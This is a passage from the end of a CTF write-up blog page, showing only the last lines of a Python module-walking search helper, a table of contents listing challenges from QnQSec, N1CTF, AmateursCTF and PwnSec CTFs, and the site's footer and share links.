class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">obj_walker(sys.modules,searcher,filter,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#QnQSec-CTF-2025-web-FaaS"><span class="toc-number">1.</span> <span class="toc-text">QnQSec CTF 2025 web FaaS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QnQSec-CTF-2025-web-Date-Logger"><span class="toc-number">2.</span> <span class="toc-text">QnQSec CTF 2025 web  Date-Logger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2025-eezzjs"><span class="toc-number">3.</span> <span class="toc-text">N1CTF 2025 eezzjs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AmateursCTF-2025-web-desafe"><span class="toc-number">4.</span> <span class="toc-text">AmateursCTF 2025 web/desafe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-A-Very-Safe-Locker-Indeed"><span class="toc-number">5.</span> <span class="toc-text">PwnSec CTF 2025 | A Very Safe Locker Indeed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-OhMyPP"><span class="toc-number">6.</span> <span class="toc-text">PwnSec CTF 2025 | OhMyPP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-FireLeak"><span class="toc-number">7.</span> <span class="toc-text">PwnSec CTF 2025 | FireLeak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-PSPD"><span class="toc-number">8.</span> <span class="toc-text">PwnSec CTF 2025 | PSPD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PwnSec-CTF-2025-MaxPayne"><span class="toc-number">9.</span> <span class="toc-text">PwnSec CTF 2025 | MaxPayne</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Devil-Net-v2"><span class="toc-number">10.</span> <span class="toc-text">Devil Net v2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backup"><span class="toc-number">11.</span> <span class="toc-text">Backup</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/10/18/QnQSecctf2025/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&text=Some CTF"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&is_video=false&description=Some CTF"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Some CTF&body=Check out this article: http://yoursite.com/2025/10/18/QnQSecctf2025/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&title=Some CTF"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/10/18/QnQSecctf2025/&name=Some CTF&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <!-- <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li> -->
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2025 Deen&#39;s blog
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>
</html>
